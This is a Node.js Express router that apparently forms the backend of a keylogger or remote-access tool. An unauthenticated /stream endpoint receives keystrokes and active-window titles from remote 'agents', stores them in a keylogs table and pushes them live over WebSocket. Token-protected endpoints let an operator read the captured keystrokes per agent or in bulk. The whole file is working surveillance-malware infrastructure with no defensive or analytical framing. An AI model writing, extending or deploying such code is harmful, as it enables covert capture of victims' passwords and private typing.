const express = require('express');
const { verifyToken } = require('./auth');
const router = express.Router();
const db = require('../database');

// Receive keystrokes in real-time
router.post('/stream', async (req, res) => {
    try {
        const { agentId, keystrokes, window, timestamp } = req.body;
        
        if (!agentId || !keystrokes) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        // Store in database
        const sql = `
            INSERT INTO keylogs (agentId, keystrokes, window, timestamp, created_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        `;
        
        db.run(sql, [agentId, keystrokes, window, timestamp || new Date().toISOString()], function(err) {
            if (err) {
                console.error('Keylog save error:', err);
                return res.status(500).json({ error: err.message });
            }
            
            // Notify via WebSocket for real-time display
            const io = req.app.get('io');
            if (io) {
                io.emit('new_keylog', {
                    id: this.lastID,
                    agentId,
                    keystrokes,
                    window,
                    timestamp
                });
            }
            
            res.json({ status: 'ok', id: this.lastID });
        });
        
    } catch (error) {
        console.error('Keylog stream error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get keylogs for an agent
router.get('/:agentId', verifyToken, async (req, res) => {
    try {
        const { agentId } = req.params;
        const { limit = 100 } = req.query;
        
        const sql = 'SELECT * FROM keylogs WHERE agentId = ? ORDER BY created_at DESC LIMIT ?';
        db.all(sql, [agentId, limit], (err, rows) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json(rows);
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Get all keylogs
router.get('/', verifyToken, async (req, res) => {
    try {
        const { limit = 500 } = req.query;
        
        const sql = 'SELECT * FROM keylogs ORDER BY created_at DESC LIMIT ?';
        db.all(sql, [limit], (err, rows) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json(rows);
        });
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;